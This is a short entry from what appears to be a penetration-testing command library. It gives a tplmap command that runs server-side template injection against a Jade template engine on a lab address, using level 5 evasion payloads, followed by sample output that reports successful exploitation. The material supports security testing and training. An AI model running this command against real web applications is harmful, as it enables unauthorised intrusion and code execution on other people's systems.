---
id: 8f14d1ee-c1b8-4d4a-867c-45bd7a010acc
name: tplmap-advanced-jade-injection
type: command
executor: bash
data: >-
  python2.7 ./tplmap.py -u
  "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e
  jade
output: null
created_at: '2023-04-06T03:56:38.834281+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - ssti
  - jade
verified: true
validated: true
---

# tplmap-advanced-jade-injection

## Command

```bash
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
```

## Description

Performs advanced SSTI injection targeting Jade engine at level 5 obfuscation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -u | Target URL with injection point | Yes |
| --level 5 | Use level 5 payloads for evasion | Yes |
| -e jade | Target Jade engine | Yes |

## Examples

### Basic Usage

```bash
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
```

## Expected Output

Successful exploitation:
```
[+] Jade vulnerable at level 5.
[*] Executed: include 'malicious'
```

## Related

- [[procedures/Exploit-Server-Side-Template-Injection-with-tplmap-and-sstimap]]
- [[tools/tplmap]]
